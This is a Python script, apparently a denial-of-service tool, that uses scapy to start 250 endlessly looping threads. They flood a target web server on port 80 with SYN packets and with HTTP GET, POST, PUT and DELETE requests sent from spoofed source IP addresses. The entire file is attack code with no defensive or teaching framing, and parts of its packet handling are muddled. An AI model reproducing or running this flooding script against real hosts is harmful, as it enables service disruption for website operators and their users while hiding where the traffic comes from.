from scapy.all import IP, TCP, sr, Ether, sendp, ICMP, Raw, srp
import threading
import random
import time

# Define the target host and port
target_host = "YourWebsite"
target_port = 80

# List of source IP addresses
source_ips = ["192.168.100.1", "192.168.100.2", "192.168.100.3"]

def send_syn_packets():
    while True:
        # Randomly select a source IP address
        source_ip = random.choice(source_ips)
        ip_packet = IP(src=source_ip, dst=target_host)

        responses = sr(ip_packet / TCP(dport=target_port, flags="S"), timeout=2, multi=True)
        print(f"Thread received {len(responses)} responses from {target_host}")

        for response in responses:
            if response:
                print(response.summary())
            else:
                print("No response received")

def send_http_get_requests():
    while True:
        # HTTP GET request
        http_request = "GET /index.php HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n" % target_host

        # Randomly select a source IP address
        source_ip = random.choice(source_ips)

        ether_frame = Ether(src="00:1A:2B:3C:4D:5E", dst="FF:FF:FF:FF:FF:FF")
        ip_packet = IP(src=source_ip, dst=target_host, ttl=64) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S") / Raw(load=http_request)

        # Send SYN packet to initiate the connection
        responses = srp(ether_frame / ip_packet, timeout=2, verbose=False)[0]

        for packet in responses:
            if packet.haslayer(TCP) and packet[TCP].flags == 0x12:  # SYN-ACK received
                # Send ACK to complete the three-way handshake
                ack_packet = Ether(src="00:1A:2B:3C:4D:5E", dst=packet[0].src) / IP(src=source_ip, dst=target_host) / TCP(dport=target_port, sport=packet[TCP].sport, flags="A", seq=packet[TCP].ack, ack=packet[TCP].seq + 1)
                sendp(ack_packet)

def send_http_post_requests():
    while True:
        # HTTP POST request
        post_data = "param1=value1&param2=value2"
        content_length = len(post_data)

        http_request = f"POST /index.php HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {content_length}\r\nConnection: keep-alive\r\n\r\n{post_data}"

        # Randomly select a source IP address
        source_ip = random.choice(source_ips)

        ether_frame = Ether(src="00:1A:2B:3C:4D:5E", dst="FF:FF:FF:FF:FF:FF")
        ip_packet = IP(src=source_ip, dst=target_host, ttl=64) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S") / Raw(load=http_request)

        # Send SYN packet to initiate the connection
        responses = srp(ether_frame / ip_packet, timeout=2, verbose=False)[0]

        for packet in responses:
            if packet.haslayer(TCP) and packet[TCP].flags == 0x12:  # SYN-ACK received
                # Send ACK to complete the three-way handshake
                ack_packet = Ether(src="00:1A:2B:3C:4D:5E", dst=packet[0].src) / IP(src=source_ip, dst=target_host) / TCP(dport=target_port, sport=packet[TCP].sport, flags="A", seq=packet[TCP].ack, ack=packet[TCP].seq + 1)
                sendp(ack_packet)

def send_http_put_requests():
    while True:
        # HTTP PUT request
        put_data = "param3=value3"
        content_length = len(put_data)

        http_request = f"PUT /index.php HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {content_length}\r\nConnection: keep-alive\r\n\r\n{put_data}"

        # Randomly select a source IP address
        source_ip = random.choice(source_ips)

        ether_frame = Ether(src="00:1A:2B:3C:4D:5E", dst="FF:FF:FF:FF:FF:FF")
        ip_packet = IP(src=source_ip, dst=target_host, ttl=64) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S") / Raw(load=http_request)

        # Send SYN packet to initiate the connection
        responses = srp(ether_frame / ip_packet, timeout=2, verbose=False)[0]

        for packet in responses:
            if packet.haslayer(TCP) and packet[TCP].flags == 0x12:  # SYN-ACK received
                # Send ACK to complete the three-way handshake
                ack_packet = Ether(src="00:1A:2B:3C:4D:5E", dst=packet[0].src) / IP(src=source_ip, dst=target_host) / TCP(dport=target_port, sport=packet[TCP].sport, flags="A", seq=packet[TCP].ack, ack=packet[TCP].seq + 1)
                sendp(ack_packet)

def send_http_delete_requests():
    while True:
        # HTTP DELETE request
        http_request = "DELETE /index.php HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n" % target_host

        # Randomly select a source IP address
        source_ip = random.choice(source_ips)

        ether_frame = Ether(src="00:1A:2B:3C:4D:5E", dst="FF:FF:FF:FF:FF:FF")
        ip_packet = IP(src=source_ip, dst=target_host, ttl=64) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S") / Raw(load=http_request)

        # Send SYN packet to initiate the connection
        responses = srp(ether_frame / ip_packet, timeout=2, verbose=False)[0]

        for packet in responses:
            if packet.haslayer(TCP) and packet[TCP].flags == 0x12:  # SYN-ACK received
                # Send ACK to complete the three-way handshake
                ack_packet = Ether(src="00:1A:2B:3C:4D:5E", dst=packet[0].src) / IP(src=source_ip, dst=target_host) / TCP(dport=target_port, sport=packet[TCP].sport, flags="A", seq=packet[TCP].ack, ack=packet[TCP].seq + 1)
                sendp(ack_packet)

# Number of threads
num_threads = 50

threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_syn_packets)
    threads.append(thread)
    thread.start()

for i in range(num_threads):
    thread = threading.Thread(target=send_http_get_requests)
    threads.append(thread)
    thread.start()

for i in range(num_threads):
    thread = threading.Thread(target=send_http_post_requests)
    threads.append(thread)
    thread.start()

for i in range(num_threads):
    thread = threading.Thread(target=send_http_put_requests)
    threads.append(thread)
    thread.start()

for i in range(num_threads):
    thread = threading.Thread(target=send_http_delete_requests)
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

print(f"Total threads completed")
